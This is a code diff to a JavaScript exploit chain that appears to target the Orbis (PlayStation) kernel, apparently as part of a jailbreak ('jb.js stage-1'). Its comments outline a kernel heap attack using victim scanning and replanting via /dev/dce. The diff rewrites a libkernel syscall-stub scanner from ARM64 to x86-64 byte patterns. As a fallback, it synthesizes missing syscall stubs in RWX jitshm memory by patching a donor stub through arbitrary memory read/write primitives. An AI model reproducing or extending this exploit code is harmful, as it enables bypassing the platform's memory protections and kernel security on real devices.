@@ -9,9 +9,9 @@ import { HX1400_TABLES } from "./hx_tables.js";
 //   scan victims for [8]==(int)page && [12]==0 -> joined==1 -> replant
 //   flags=2 -> HELD. kevent(-23) is one-time setup AFTER this (pc 9108),
 //   NOT per attempt. dce = the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
-// v3: runtime libkernel rescan for stubs the stage-1 scanner missed.
-// v4: if rescan fails, SYNTHESIZE missing stubs: copy close(6) stub into RWX
-//     jitshm memory (jitshm_create=533), patch syscall number, register it.
+// v5: x86-64 stub fix — Orbis stubs are 48 c7 c0 <imm32> 49 89 ca 0f 05 c3
+//     (mov rax,num; mov r10,rcx; syscall; ret), 16-aligned. Rescan finds
+//     open=5 in libkernel; jitshm RWX synth kept as last fallback.
 // ============================================================================
 
 const T = HX1400_TABLES;
@@ -70,45 +70,40 @@ function allocBuf(size) {
 }
 function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }
 
-// --- stub resolution: stage-1 map -> libkernel rescan -> jitshm synth ---
-// Orbis syscall stub shape: mov w8|x8, #num ; svc #0 ; ret
-const SVC_INS = 0xd4000001;
+// --- stub resolution: stage-1 map -> x86 rescan of libkernel -> jitshm synth ---
+// Orbis x86-64 syscall stub (same pattern as jb.js stage-1):
+//   bytes[0..2]  = 48 c7 c0            mov rax, imm32
+//   bytes[3..6]  = imm32 = syscall num (little-endian)
+//   byte[7]      = 49                  REX (mov r10, rcx follows)
+//   stubs are 16-byte aligned (jb.js scans with o += 16)
 let SCAN_SEEN = 0;
 function findStubRaw(snum) {
   const p = ctx().p;
   const base = num(ctx().libkernelBase);
-  const movW = (0x52800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
-  const movX = (0xd2800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
-  const LIMIT = 0x80000; // 512KB of libkernel (v3's 128KB was not enough)
-  for (let off = 0; off < LIMIT; off += 4) {
-    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
-    const top = w & 0xffe00000;
-    if ((w === movW || w === movX)) {
-      for (let k = 1; k <= 8; k++) {
-        if ((p.read4(toI64(base + BigInt(off + 4 * k))) >>> 0) === SVC_INS)
-          return base + BigInt(off);
-      }
-    }
-    // sanity counter: any movz w8/x8 imm;svc pair
-    if ((top === 0x52800000 || top === 0xd2800000) && ((w & 0x1f) === 8)) {
-      for (let k = 1; k <= 3; k++) {
-        if ((p.read4(toI64(base + BigInt(off + 4 * k))) >>> 0) === SVC_INS) { SCAN_SEEN++; break; }
-      }
-    }
+  const LIMIT = 0x80000; // 512KB
+  for (let o = 0; o < LIMIT; o += 16) {
+    const lo = p.read4(toI64(base + BigInt(o))) >>> 0;
+    if ((lo & 0x00ffffff) !== 0x00c0c748) continue;   // 48 c7 c0
+    const hi = p.read4(toI64(base + BigInt(o) + 4n)) >>> 0;
+    if ((hi >>> 24) !== 0x49) continue;               // byte7 == 0x49
+    const n = ((lo >>> 24) | ((hi & 0x00ffffff) << 8)) >>> 0;
+    SCAN_SEEN++;
+    if (n === snum) return base + BigInt(o);
   }
   return null;
 }
 
-// Build a missing stub in RWX jitshm memory from the close(6) donor.
+// Last-resort fallback: copy donor stub into RWX jitshm memory, patch imm32.
 function synthStub(targetNum) {
   const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
   const daddr = num(ctx().stubAddr.get(donorNum));
   const p = ctx().p;
   const w0 = p.read4(toI64(daddr)) >>> 0;
-  const top = w0 & 0xffe00000;
-  const imm = (w0 >> 5) & 0xffff;
-  if ((top !== 0xd2800000 && top !== 0x52800000) || imm !== donorNum || (w0 & 0x1f) !== 8)
-    return { err: "donor " + donorNum + " ins0=0x" + w0.toString(16) + " not movz" };
+  const w1 = p.read4(toI64(daddr + 4n)) >>> 0;
+  if ((w0 & 0x00ffffff) !== 0x00c0c748 || (w1 >>> 24) !== 0x49)
+    return { err: "donor " + donorNum + " ins=0x" + w1.toString(16).padStart(8, "0") + w0.toString(16).padStart(8, "0") + " not stub" };
+  const imm = ((w0 >>> 24) | ((w1 & 0x00ffffff) << 8)) >>> 0;
+  if (imm !== donorNum) return { err: "donor imm=" + imm + " != " + donorNum };
   let jfd = scn("jitshm_create", 0, 16384, 7);
   let usedName = false;
   if (jfd < 0) {
@@ -122,14 +117,15 @@ function synthStub(targetNum) {
   const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
   if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
   if (typeof p.write4 !== "function") return { err: "p.write4 missing" };
-  const patched = (top | ((targetNum & 0xffff) << 5) | 8) >>> 0;
-  p.write4(toI64(addr), patched);
-  p.write4(toI64(addr + 4n), p.read4(toI64(daddr + 4n)) >>> 0);
+  const nlo = ((w0 & 0x00ffffff) | ((targetNum & 0xff) << 24)) >>> 0;
+  const nhi = ((w1 & 0xff000000) | ((targetNum >>> 8) & 0x00ffffff)) >>> 0;
+  p.write4(toI64(addr), nlo);
+  p.write4(toI64(addr + 4n), nhi);
   p.write4(toI64(addr + 8n), p.read4(toI64(daddr + 8n)) >>> 0);
   p.write4(toI64(addr + 12n), p.read4(toI64(daddr + 12n)) >>> 0);
   log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum +
-      " ins0=0x" + w0.toString(16) + "->0x" + patched.toString(16) +
-      " jfd=" + jfd + (usedName ? "(namebuf)" : "") + " rwx=" + h16(addr));
+      " imm=" + imm + "->" + targetNum + " jfd=" + jfd + (usedName ? "(namebuf)" : "") +
+      " rwx=" + h16(addr));
   return { addr };
 }
 
@@ -142,7 +138,7 @@ function ensureStubs() {
       log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
     }
   }
-  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
+  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB (x86 pattern)");
   missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
   for (const k of missing) {
     const r = synthStub(NUM[k]);
